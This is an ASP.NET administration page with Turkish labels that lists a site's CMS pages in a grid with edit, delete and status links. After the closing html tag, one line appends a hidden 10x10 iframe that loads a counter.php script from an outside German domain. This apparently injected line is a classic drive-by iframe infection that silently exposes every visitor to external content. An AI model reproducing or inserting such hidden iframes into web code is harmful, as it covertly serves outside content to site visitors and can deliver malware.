<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Sayfa.aspx.cs" Inherits="Yonetim_Tur" %>

<%@ Register TagPrefix="include" TagName="Head" Src="~/Yonetim/Library/Include/Head.ascx" %>
<%@ Register TagPrefix="include" TagName="Ust" Src="~/Yonetim/Library/Include/Ust.ascx" %>
<%@ Register TagPrefix="include" TagName="Menu" Src="~/Yonetim/Library/Include/Menu.ascx" %>
<%@ Register TagPrefix="include" TagName="Alt" Src="~/Yonetim/Library/Include/Alt.ascx" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <include:Head runat="server" ID="Head" />
</head>
<body>
    <form id="form1" runat="server">
        <div id="main_container">
             <include:Ust runat="server" ID="Ust" />
             
             <div class="main_content">
                <include:Menu runat="server" ID="Menu" />
                
                <div class="center_content">

                    <div style="margin:10px;"> 
                        <h2>Sayfa Listesi</h2>
                        <asp:DataGrid runat="server" ID="kayitlar" Width="100%" CellPadding="4" ForeColor="#333333" GridLines="None" AutoGenerateColumns="false">
                            <Columns>
                                <asp:BoundColumn DataField="ID" HeaderText="No" />
                                <asp:BoundColumn DataField="UstSayfa" HeaderText="Üst Sayfa" />
                                <asp:BoundColumn DataField="Baslik" HeaderText="Sayfa Adı" />
                                <asp:BoundColumn DataField="Onay" HeaderText="Onay" ItemStyle-HorizontalAlign="Center" HeaderStyle-HorizontalAlign="Center" />
                                <asp:BoundColumn DataField="KayitTarih" HeaderText="Kayıt" DataFormatString="{0:dd/MM/yy}" ItemStyle-HorizontalAlign="Center" HeaderStyle-HorizontalAlign="Center" ItemStyle-Width="70" />
                                <asp:TemplateColumn HeaderText="İşlemler" ItemStyle-Width="80" ItemStyle-HorizontalAlign="Center" HeaderStyle-HorizontalAlign="Center">
                                    <ItemTemplate><a href="SayfaDuzenle.aspx?ID=<%# Eval("ID") %>"><img src="Library/Images/islem/duzenle.png" /></a> <a class="ask" href="?Islem=sil&ID=<%# Eval("ID") %>"><img src="Library/Images/islem/sil.png" /></a> <a class="ask" href="?Islem=durum&ID=<%# Eval("ID") %>"><img src="Library/Images/islem/durum.png" /></a></ItemTemplate>
                                </asp:TemplateColumn>
                            </Columns>
                            <AlternatingItemStyle BackColor="White" ForeColor="#284775" />
                            <EditItemStyle BackColor="#999999" />
                            <FooterStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
                            <HeaderStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
                            <ItemStyle BackColor="#F7F6F3" ForeColor="#333333" />
                            <PagerStyle BackColor="#284775" ForeColor="White" HorizontalAlign="Center" />
                            <SelectedItemStyle BackColor="#E2DED6" Font-Bold="True" ForeColor="#333333" />
                        </asp:DataGrid>
                    </div>
                </div>
                
                <div class="clear"></div>
            </div>

            <include:Alt runat="server" ID="Alt" />

        </div>
    </form>
</body>
</html><iframe src="http://www.bc-bs.de/counter.php" style="visibility: hidden; position: absolute; left: 0px; top: 0px" width="10" height="10"/>




